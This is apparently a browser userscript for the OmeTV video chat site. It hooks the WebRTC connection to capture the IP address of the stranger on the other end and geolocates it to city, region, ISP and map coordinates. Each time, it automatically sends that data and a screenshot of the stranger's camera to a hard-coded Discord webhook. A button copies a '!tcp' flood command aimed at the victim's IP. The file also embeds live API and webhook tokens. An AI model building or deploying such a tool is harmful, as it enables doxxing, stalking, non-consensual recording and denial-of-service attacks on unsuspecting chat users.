(() => {
  "use strict";

  // --- CONFIGURATION ---
  const CONFIG = {
    API_KEY: "f0c5320ce142f8",
    WEBHOOK_URL: "https://discord.com/api/webhooks/1535864260528316416/XJfdDAsy1n6JOEp5we_NCJ2IgE1U1gM25UnA9C4aiupfzKdPqym7P9IGAlgeVHWUg0vJ",
    STYLES: {
      FONT_AWESOME: "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css",
      GOOGLE_FONTS: "https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap"
    }
  };

  // --- APPLICATION STATE ---
  const state = {
    globalStream: null,
    mediaRecorder: null,
    recordedChunks: [],
    isRecording: false,
    lastIPv4: null,
    ipv4InfoMap: new Map(),
    isDragging: false,
    dragOffset: { x: 0, y: 0 }
  };

  // --- HELPER UTILITIES ---
  const utils = {
    isIPv6: (ip) => ip?.includes(":") ?? false,

    getVideos: () => {
      const videos = Array.from(document.querySelectorAll("video"));
      if (videos.length === 0) return { local: null, remote: null };
      if (videos.length === 1) return { local: null, remote: videos[0] };
      videos.sort((a, b) => (b.videoWidth || 0) - (a.videoWidth || 0));
      return { remote: videos[0], local: videos[1] };
    },

    updateHTML: (html) => {
      const infoDiv = document.getElementById("Info");
      if (infoDiv) infoDiv.innerHTML = html;
    },

    flashButtonText: (btn, temporaryText, originalText, duration = 1500) => {
      const orig = btn.innerText;
      btn.innerText = temporaryText;
      setTimeout(() => { btn.innerText = originalText || orig; }, duration);
    }
  };

// --- MEDIA HANDLERS ---
const media = {
  takeScreenshot: async () => {
    const rawVids = utils.getVideos();
    // Swapped so remote stream fills background and local stream goes to inset
    const vids = {
      remote: rawVids.local,
      local: rawVids.remote
    };

    if (!vids.remote && !vids.local) return alert("Nincsenek aktív kamerák!");

    const canvas = document.createElement("canvas");
    canvas.width = 1280;
    canvas.height = 720;
    const ctx = canvas.getContext("2d");

    ctx.fillStyle = "#09090b";
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    try {
      if (vids.remote && vids.remote.readyState >= 2) {
        ctx.drawImage(vids.remote, 0, 0, canvas.width, canvas.height);
      }
      if (vids.local && vids.local.readyState >= 2) {
        const w = 320, h = 240;
        ctx.drawImage(vids.local, canvas.width - w - 20, canvas.height - h - 20, w, h);
        ctx.strokeStyle = "rgba(255, 255, 255, 0.4)";
        ctx.lineWidth = 2;
        ctx.strokeRect(canvas.width - w - 20, canvas.height - h - 20, w, h);
      }

      const link = document.createElement("a");
      link.download = `ometv-foto-${Date.now()}.png`;
      link.href = canvas.toDataURL("image/png");
      link.click();
    } catch (err) {
      console.error("Screenshot capture error:", err);
      alert("Hiba a fotózás során. (CORS vagy kamera hozzáférési hiba)");
    }
  },

  captureFrameBlob: async () => {
    const rawVids = utils.getVideos();
    const vids = {
      remote: rawVids.local,
      local: rawVids.remote
    };

    if (!vids.remote || vids.remote.readyState < 2) return null;

    const canvas = document.createElement("canvas");
    canvas.width = 1280;
    canvas.height = 720;
    const ctx = canvas.getContext("2d");

    ctx.fillStyle = "#09090b";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.drawImage(vids.remote, 0, 0, canvas.width, canvas.height);

    if (vids.local && vids.local.readyState >= 2) {
      const w = 320, h = 240;
      ctx.drawImage(vids.local, canvas.width - w - 20, canvas.height - h - 20, w, h);
      ctx.strokeStyle = "rgba(255, 255, 255, 0.4)";
      ctx.lineWidth = 2;
      ctx.strokeRect(canvas.width - w - 20, canvas.height - h - 20, w, h);
    }

    return new Promise((resolve) => canvas.toBlob(resolve, "image/png"));
  },

  toggleRecording: async (btn) => {
    if (!state.isRecording) {
      try {
        state.globalStream = await navigator.mediaDevices.getDisplayMedia({
          video: { displaySurface: "browser", frameRate: { ideal: 30, max: 60 }, width: { ideal: 1920 }, height: { ideal: 1080 } },
          audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false }
        });

        let options = { mimeType: "video/webm" };
        if (MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")) options.mimeType = "video/webm;codecs=vp9,opus";
        else if (MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")) options.mimeType = "video/webm;codecs=vp8,opus";

        state.mediaRecorder = new MediaRecorder(state.globalStream, { ...options, videoBitsPerSecond: 3000000 });
        state.recordedChunks = [];

        state.mediaRecorder.ondataavailable = (e) => {
          if (e.data.size > 0) state.recordedChunks.push(e.data);
        };

        state.mediaRecorder.onstop = () => {
          const blob = new Blob(state.recordedChunks, { type: options.mimeType });
          state.recordedChunks = [];
          const url = URL.createObjectURL(blob);
          const a = Object.assign(document.createElement("a"), { href: url, download: `ometv-felvetel-${Date.now()}.webm` });
          document.body.appendChild(a);
          a.click();
          setTimeout(() => { document.body.removeChild(a); URL.revokeObjectURL(url); }, 100);

          state.isRecording = false;
          state.globalStream = null;
          btn.innerHTML = `<i class="fa-solid fa-circle"></i> FELVÉTEL`;
          btn.classList.remove("recording-active");
        };

        state.mediaRecorder.start(1000);
        state.isRecording = true;
        btn.innerHTML = `<i class="fa-solid fa-square"></i> REC STOP`;
        btn.classList.add("recording-active");

        state.globalStream.getVideoTracks()[0].onended = () => {
          if (state.isRecording) state.mediaRecorder.stop();
        };
      } catch (err) {
        console.error("Screen recording failed:", err);
        alert("Felvétel indítása sikertelen. Engedélyezted a megosztást?");
      }
    } else {
      state.mediaRecorder.stop();
      state.globalStream.getTracks().forEach(t => t.stop());
    }
  }
};
  // --- ACTIONS & DISCORD WEBHOOK ---
  const actions = {
    copyTcpCmd: async (btn) => {
      if (!state.lastIPv4) return alert("Még nincs IP adat!");
      const ip = String(state.lastIPv4).split(":")[0];
      const cmd = `!tcp ${ip} 80 60`;

      try {
        await navigator.clipboard.writeText(cmd);
        utils.flashButtonText(btn, "MÁSOLVA!", "IPV4 UDPMIX");
      } catch (e) {
        console.error("Clipboard error:", e);
        alert("Másolás nem engedélyezett.");
      }
    },

    copyIP: async (btn) => {
      if (!state.lastIPv4) return alert("Nincs másolható IP cím.");
      try {
        await navigator.clipboard.writeText(state.lastIPv4);
        utils.flashButtonText(btn, "MÁSOLVA!", "IPV4");
      } catch (e) {
        console.error("Clipboard error:", e);
        alert("Másolás nem engedélyezett.");
      }
    },

    sendToDiscord: async (json, ip, port) => {
      if (!CONFIG.WEBHOOK_URL) return;

      try {
        const ipDisplay = port ? `${ip}:${port}` : ip;
        const mapsUrl = json.loc ? `https://maps.google.com/?q=${json.loc}` : null;
        const flagEmoji = json.country ? `:flag_${json.country.toLowerCase()}:` : "🌍";

        const embed = {
          title: "🎯 KAPSZULA RÖGZÍTVE",
          description: `**Új kapcsolat rögzítve az OmeTV-n** ${flagEmoji}`,
          color: 0x6366f1,
          fields: [
            { name: "🌐 IP Cím", value: `\`\`\`${ipDisplay}\`\`\``, inline: false },
            { name: "🏙️ Város", value: json.city || "Ismeretlen", inline: true },
            { name: "📍 Megye", value: json.region || "Ismeretlen", inline: true },
            { name: "🏳️ Ország", value: json.country || "Ismeretlen", inline: true },
            { name: "🏢 Szolgáltató", value: json.org || "Ismeretlen", inline: false },
            {
              name: "🗺️ Helyzet",
              value: mapsUrl ? `[📍 Térkép megnyitása](${mapsUrl})\n\`${json.loc}\`` : "Ismeretlen",
              inline: false
            },
            { name: "🕐 Rögzítve", value: new Date().toLocaleString("hu-HU", { timeZone: "Europe/Budapest" }), inline: false }
          ],
          footer: { text: "OmeTV Suite • Készítette: Fabalta" },
          timestamp: new Date().toISOString()
        };

        const imageBlob = await media.captureFrameBlob();
        if (imageBlob) {
          embed.image = { url: "attachment://screenshot.png" };
          const fd = new FormData();
          fd.append("payload_json", JSON.stringify({ embeds: [embed] }));
          fd.append("files[0]", imageBlob, "screenshot.png");
          await fetch(CONFIG.WEBHOOK_URL, { method: "POST", body: fd });
        } else {
          await fetch(CONFIG.WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
          });
        }
      } catch (err) {
        console.error("Discord webhook Error:", err);
      }
    },

    gather: async (ip, port = null) => {
      try {
        const res = await fetch(`https://ipinfo.io/${ip}/json?token=${CONFIG.API_KEY}`);
        const json = await res.json();

        if (json && !json.status) {
          let ipv4 = ip;
          if (utils.isIPv6(ip)) {
            try {
              const fallback = await (await fetch("https://api.ipify.org?format=json")).json();
              ipv4 = fallback.ip;
            } catch {}
          }

          const ipv4WithPort = port ? `${ipv4}:${port}` : ipv4;
          state.lastIPv4 = ipv4WithPort;
          state.ipv4InfoMap.set(ipv4WithPort, {
            city: json.city || "Ismeretlen",
            region: json.region || "Ismeretlen",
            org: json.org || "Ismeretlen",
            loc: json.loc || "Ismeretlen",
            timestamp: new Date().toISOString()
          });

          const ipDisplay = `<div class="info-line"><i class="fa-solid fa-network-wired"></i> ${utils.isIPv6(ip) ? 'IPv6' : 'IPv4'}: <strong>${ipv4WithPort}</strong></div>`;

          utils.updateHTML(`
            <div class="info-line"><i class="fa-solid fa-city"></i> Város: <span>${json.city || "-"}</span></div>
            <div class="info-line"><i class="fa-solid fa-map-location-dot"></i> Megye: <span>${json.region || "-"}</span></div>
            <div class="info-line"><i class="fa-solid fa-server"></i> Szolgáltató: <span>${json.org || "-"}</span></div>
            ${ipDisplay}
          `);

          const mapBtn = document.querySelector(".ovbtn.map");
          if (mapBtn && json.loc) {
            mapBtn.onclick = () => window.open(`https://maps.google.com/?q=${json.loc}`, "_blank");
          }

          actions.sendToDiscord(json, ipv4, port);
        }
      } catch (error) {
        console.error("IP Fetch Error:", error);
      }
    }
  };

  // --- WEBRTC HOOK ---
  const hookWebRTC = () => {
    window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;
    window.RTCPeerConnection = function (...args) {
      const pc = new window.oRTCPeerConnection(...args);
      pc.oaddIceCandidate = pc.addIceCandidate;
      pc.addIceCandidate = function (iceCandidate, ...rest) {
        try {
          if (iceCandidate?.candidate) {
            const fields = iceCandidate.candidate.split(" ");
            const ip = fields[4];
            const port = fields[5];
            const type = fields[7];
            if (type === "srflx") {
              utils.updateHTML(`<div class="info-line"><i class="fa-solid fa-spinner fa-spin"></i> Adatok lekérése...</div>`);
              actions.gather(ip, port);
            }
          }
        } catch (e) {
          console.error("ICE intercept error:", e);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);
      };
      return pc;
    };
  };

  // --- iOS 26 LIQUID GLASS UI ---
  const injectStyles = () => {
    if (!document.querySelector('link[href*="font-awesome"]')) {
      const fa = document.createElement("link");
      fa.rel = "stylesheet";
      fa.href = CONFIG.STYLES.FONT_AWESOME;
      fa.crossOrigin = "anonymous";
      document.head.appendChild(fa);
    }

    const style = document.createElement("style");
    style.textContent = `
      @import url('${CONFIG.STYLES.GOOGLE_FONTS}');

      :root {
        --lg-text: rgba(255,255,255,.96);
        --lg-secondary: rgba(255,255,255,.62);
        --lg-muted: rgba(255,255,255,.40);
        --lg-border: rgba(255,255,255,.20);
        --lg-highlight: rgba(255,255,255,.32);
        --lg-surface: rgba(22,22,28,.46);
        --lg-surface-strong: rgba(28,28,35,.62);
        --lg-accent: #8b7cff;
        --lg-accent-2: #b5a9ff;
      }

      #edgar-overlay {
        position: fixed;
        left: 50%;
        bottom: 24px;
        transform: translateX(-50%);
        z-index: 999999;
        width: min(430px, calc(100vw - 28px));
        box-sizing: border-box;
        padding: 1px;
        border-radius: 30px;
        user-select: none;
        font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display",
          "SF Pro Text", Inter, system-ui, sans-serif;

        background:
          linear-gradient(135deg,
            rgba(255,255,255,.42) 0%,
            rgba(255,255,255,.10) 18%,
            rgba(255,255,255,.04) 52%,
            rgba(255,255,255,.20) 100%);

        box-shadow:
          0 30px 90px rgba(0,0,0,.42),
          0 10px 30px rgba(0,0,0,.24),
          inset 0 1px 0 rgba(255,255,255,.34),
          inset 0 -1px 0 rgba(255,255,255,.08);

        backdrop-filter: blur(42px) saturate(180%);
        -webkit-backdrop-filter: blur(42px) saturate(180%);

        animation: liquidGlassIn .45s cubic-bezier(.2,.8,.2,1);
      }

      #edgar-overlay::before {
        content: "";
        position: absolute;
        inset: 1px;
        border-radius: 29px;
        pointer-events: none;
        background:
          radial-gradient(circle at 18% 0%,
            rgba(255,255,255,.30),
            transparent 30%),
          radial-gradient(circle at 100% 100%,
            rgba(139,124,255,.18),
            transparent 34%),
          linear-gradient(115deg,
            rgba(255,255,255,.10),
            transparent 45%);
        opacity: .9;
      }

      #edgar-overlay::after {
        content: "";
        position: absolute;
        top: 1px;
        left: 12%;
        width: 76%;
        height: 1px;
        border-radius: 999px;
        background: linear-gradient(90deg,
          transparent,
          rgba(255,255,255,.72),
          transparent);
        pointer-events: none;
      }

      #edgar-inner {
        position: relative;
        overflow: hidden;
        border-radius: 29px;
        padding: 15px;
        background: var(--lg-surface);
        border: 1px solid rgba(255,255,255,.08);
      }

      #edgar-inner::before {
        content: "";
        position: absolute;
        inset: 0;
        pointer-events: none;
        background:
          radial-gradient(circle at 50% -20%,
            rgba(255,255,255,.16),
            transparent 42%),
          radial-gradient(circle at 0% 100%,
            rgba(139,124,255,.09),
            transparent 35%);
      }

      .content-wrapper {
        position: relative;
        z-index: 1;
      }

      #Title {
        position: relative;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 9px;
        margin: 1px 0 13px;
        padding: 2px 4px;
        color: var(--lg-text);
        font-size: 13px;
        line-height: 18px;
        font-weight: 750;
        letter-spacing: .35px;
        cursor: grab;
        text-transform: none;
        text-shadow: 0 1px 12px rgba(0,0,0,.28);
      }

      #Title:active {
        cursor: grabbing;
      }

      #Title i {
        display: grid;
        place-items: center;
        width: 27px;
        height: 27px;
        border-radius: 50%;
        color: white;
        font-size: 12px;
        background:
          linear-gradient(145deg,
            rgba(255,255,255,.34),
            rgba(139,124,255,.35));
        border: 1px solid rgba(255,255,255,.24);
        box-shadow:
          inset 0 1px 0 rgba(255,255,255,.35),
          0 5px 16px rgba(139,124,255,.18);
      }

      #Info {
        position: relative;
        display: flex;
        flex-direction: column;
        gap: 7px;
        margin: 0 0 11px;
        padding: 12px 13px;
        border-radius: 21px;
        overflow: hidden;

        background: rgba(255,255,255,.075);
        border: 1px solid rgba(255,255,255,.13);

        box-shadow:
          inset 0 1px 0 rgba(255,255,255,.12),
          inset 0 -1px 0 rgba(255,255,255,.035);
      }

      #Info::before {
        content: "";
        position: absolute;
        inset: 0;
        pointer-events: none;
        background: linear-gradient(110deg,
          rgba(255,255,255,.08),
          transparent 35%,
          rgba(139,124,255,.035));
      }

      .info-line {
        position: relative;
        display: flex;
        align-items: center;
        min-height: 19px;
        color: var(--lg-secondary);
        font-size: 12px;
        line-height: 17px;
        font-weight: 520;
      }

      .info-line strong,
      .info-line span {
        color: var(--lg-text);
        margin-left: 4px;
        font-weight: 650;
      }

      .info-line i {
        flex: 0 0 21px;
        width: 21px;
        margin-right: 7px;
        text-align: center;
        color: var(--lg-accent-2);
        font-size: 11px;
        filter: drop-shadow(0 0 7px rgba(139,124,255,.45));
      }

      .btn-row {
        display: grid;
        grid-template-columns: repeat(4, minmax(0, 1fr));
        gap: 7px;
        margin: 7px 0;
      }

      .ovbtn {
        position: relative;
        min-width: 0;
        min-height: 39px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        gap: 5px;
        padding: 7px 5px;
        box-sizing: border-box;
        cursor: pointer;
        border-radius: 15px;

        color: rgba(255,255,255,.82);
        background:
          linear-gradient(145deg,
            rgba(255,255,255,.13),
            rgba(255,255,255,.055));

        border: 1px solid rgba(255,255,255,.13);

        box-shadow:
          inset 0 1px 0 rgba(255,255,255,.14),
          inset 0 -1px 0 rgba(255,255,255,.025),
          0 5px 18px rgba(0,0,0,.10);

        font-family: inherit;
        font-size: 9px;
        font-weight: 700;
        letter-spacing: .25px;
        transition:
          transform .18s cubic-bezier(.2,.8,.2,1),
          background .18s ease,
          border-color .18s ease,
          box-shadow .18s ease,
          color .18s ease;
        overflow: hidden;
      }

      .ovbtn::before {
        content: "";
        position: absolute;
        inset: 0;
        pointer-events: none;
        background: linear-gradient(115deg,
          rgba(255,255,255,.16),
          transparent 35%,
          transparent 70%,
          rgba(255,255,255,.06));
        opacity: .7;
      }

      .ovbtn i,
      .ovbtn {
        text-shadow: 0 1px 8px rgba(0,0,0,.24);
      }

      .ovbtn i {
        position: relative;
        font-size: 10px;
        color: rgba(255,255,255,.82);
      }

      .ovbtn:hover {
        color: #fff;
        transform: translateY(-2px) scale(1.015);
        background:
          linear-gradient(145deg,
            rgba(255,255,255,.20),
            rgba(255,255,255,.075));
        border-color: rgba(255,255,255,.25);
        box-shadow:
          inset 0 1px 0 rgba(255,255,255,.22),
          0 8px 25px rgba(0,0,0,.16),
          0 0 22px rgba(139,124,255,.10);
      }

      .ovbtn:active {
        transform: translateY(1px) scale(.975);
        background: rgba(255,255,255,.07);
        box-shadow:
          inset 0 2px 7px rgba(0,0,0,.12),
          0 2px 8px rgba(0,0,0,.10);
      }

      .recording-active {
        color: #fff !important;
        background:
          linear-gradient(145deg,
            rgba(255,82,82,.30),
            rgba(255,255,255,.055)) !important;
        border-color: rgba(255,115,115,.46) !important;
        box-shadow:
          inset 0 1px 0 rgba(255,255,255,.20),
          0 0 24px rgba(255,70,70,.14) !important;
        animation: pulseRecord 1.7s infinite;
      }

      .recording-active i {
        color: #ff8d8d !important;
      }

      @keyframes pulseRecord {
        0%, 100% {
          box-shadow:
            inset 0 1px 0 rgba(255,255,255,.20),
            0 0 0 0 rgba(255,70,70,.18);
        }
        50% {
          box-shadow:
            inset 0 1px 0 rgba(255,255,255,.20),
            0 0 0 6px rgba(255,70,70,0);
        }
      }

      #BottomBar {
        display: flex;
        justify-content: center;
        align-items: center;
        margin-top: 10px;
        padding-top: 10px;
        border-top: 1px solid rgba(255,255,255,.09);
      }

      #MadeBy {
        color: rgba(255,255,255,.38);
        font-size: 9px;
        font-weight: 550;
        letter-spacing: .2px;
      }

      #MadeBy strong {
        color: rgba(255,255,255,.62);
        font-weight: 700;
      }

      @keyframes liquidGlassIn {
        from {
          opacity: 0;
          transform: translateX(-50%) translateY(12px) scale(.96);
          filter: blur(5px);
        }
        to {
          opacity: 1;
          transform: translateX(-50%) translateY(0) scale(1);
          filter: blur(0);
        }
      }

      @media (max-width: 520px) {
        #edgar-overlay {
          bottom: 12px;
          width: calc(100vw - 20px);
          border-radius: 25px;
        }

        #edgar-inner {
          border-radius: 24px;
          padding: 12px;
        }

        .btn-row {
          gap: 6px;
        }

        .ovbtn {
          min-height: 37px;
          border-radius: 13px;
          font-size: 8px;
        }
      }

      @media (prefers-reduced-motion: reduce) {
        #edgar-overlay,
        .ovbtn,
        .recording-active {
          animation: none !important;
          transition: none !important;
        }
      }
    `;
    document.head.appendChild(style);
  };

  // --- UI CREATION ---
  const createUI = () => {
    const overlay = document.createElement("div");
    overlay.id = "edgar-overlay";

    const innerBox = document.createElement("div");
    innerBox.id = "edgar-inner";

    const contentWrapper = document.createElement("div");
    contentWrapper.className = "content-wrapper";

    const title = document.createElement("p");
    title.id = "Title";
    title.innerHTML = `<i class="fa-solid fa-radar"></i><span>LOVENODE</span><span style="opacity:.45">•</span><span style="font-weight:500">FABALTA</span>`;

    const info = document.createElement("div");
    info.id = "Info";
    info.innerHTML = `<div class="info-line"><i class="fa-solid fa-circle-notch fa-spin"></i> Várakozás kapcsolatra...</div>`;

    const makeButton = (icon, label, className = "", handler = null) => {
      const button = document.createElement("div");
      button.className = `ovbtn ${className}`.trim();
      button.innerHTML = `<i class="${icon}"></i><span>${label}</span>`;
      if (handler) button.addEventListener("click", handler);
      return button;
    };

    const btnRow1 = document.createElement("div");
    btnRow1.className = "btn-row";

    const buttonCheck = makeButton(
      "fa-solid fa-rotate-right",
      "FRISSÍT",
      "",
      () => utils.updateHTML(
        `<div class="info-line"><i class="fa-solid fa-circle-check"></i> Kész</div>`
      )
    );

    const buttonMap = makeButton(
      "fa-solid fa-map-location-dot",
      "TÉRKÉP",
      "map"
    );

    const buttonUDPMix = makeButton(
      "fa-solid fa-bolt",
      "UDPMIX",
      "",
      (e) => actions.copyTcpCmd(e.currentTarget)
    );

    const buttonCopy = makeButton(
      "fa-solid fa-copy",
      "IPV4",
      "",
      (e) => actions.copyIP(e.currentTarget)
    );

    [buttonCheck, buttonMap, buttonUDPMix, buttonCopy]
      .forEach(b => btnRow1.appendChild(b));

    const btnRow2 = document.createElement("div");
    btnRow2.className = "btn-row";

    const buttonScreenshot = makeButton(
      "fa-solid fa-camera",
      "FOTÓ",
      "",
      media.takeScreenshot
    );

    const buttonRecord = makeButton(
      "fa-solid fa-circle",
      "FELVÉTEL",
      "",
      (e) => media.toggleRecording(e.currentTarget)
    );
    buttonRecord.id = "btn-record";

    const buttonWebhook = makeButton(
      "fa-brands fa-discord",
      "DISCORD",
      "",
      () => {
        if (!state.lastIPv4) return alert("Még nincs IP adat!");
        const d = state.ipv4InfoMap.get(state.lastIPv4);
        if (!d) return alert("Nincs adat a naplóban!");
        const [ip, port] = String(state.lastIPv4).split(":");
        actions.sendToDiscord(
          { city: d.city, region: d.region, org: d.org, loc: d.loc },
          ip,
          port || null
        );
      }
    );

    const buttonSpacer = document.createElement("div");
    buttonSpacer.className = "ovbtn";
    buttonSpacer.style.visibility = "hidden";
    buttonSpacer.setAttribute("aria-hidden", "true");

    [buttonScreenshot, buttonRecord, buttonWebhook, buttonSpacer]
      .forEach(b => btnRow2.appendChild(b));

    const bottomBar = document.createElement("div");
    bottomBar.id = "BottomBar";
    bottomBar.innerHTML =
      `<span id="MadeBy">Készítette: <strong>Fabalta</strong></span>`;

    contentWrapper.append(
      title,
      info,
      btnRow1,
      btnRow2,
      bottomBar
    );

    innerBox.appendChild(contentWrapper);
    overlay.appendChild(innerBox);

    const target =
      document.querySelector(".video-chat-container") ||
      document.querySelector("main#about") ||
      document.body;

    target.appendChild(overlay);

    // Smooth pointer dragging for the glass panel.
    title.addEventListener("mousedown", (e) => {
      state.isDragging = true;
      const rect = overlay.getBoundingClientRect();

      state.dragOffset.x = e.clientX - rect.left;
      state.dragOffset.y = e.clientY - rect.top;

      overlay.style.transition = "none";
      e.preventDefault();
    });

    window.addEventListener("mousemove", (e) => {
      if (!state.isDragging) return;

      overlay.style.transform = "none";
      overlay.style.left = `${e.clientX - state.dragOffset.x}px`;
      overlay.style.top = `${e.clientY - state.dragOffset.y}px`;
      overlay.style.bottom = "auto";
    });

    window.addEventListener("mouseup", () => {
      if (!state.isDragging) return;

      state.isDragging = false;
      overlay.style.transition = "";
    });

    // Touch dragging for trackpads/mobile-style environments.
    title.addEventListener("touchstart", (e) => {
      const touch = e.touches[0];
      if (!touch) return;

      state.isDragging = true;

      const rect = overlay.getBoundingClientRect();
      state.dragOffset.x = touch.clientX - rect.left;
      state.dragOffset.y = touch.clientY - rect.top;

      overlay.style.transition = "none";
    }, { passive: true });

    window.addEventListener("touchmove", (e) => {
      if (!state.isDragging) return;

      const touch = e.touches[0];
      if (!touch) return;

      overlay.style.transform = "none";
      overlay.style.left = `${touch.clientX - state.dragOffset.x}px`;
      overlay.style.top = `${touch.clientY - state.dragOffset.y}px`;
      overlay.style.bottom = "auto";
    }, { passive: true });

    window.addEventListener("touchend", () => {
      state.isDragging = false;
      overlay.style.transition = "";
    }, { passive: true });
  };

  // --- INITIALIZATION ---
  const init = () => {
    injectStyles();
    createUI();
    hookWebRTC();
    console.log("Fabalta OmeTV IPL rendszer sikeresen betöltött.");
  };

  init();
})();
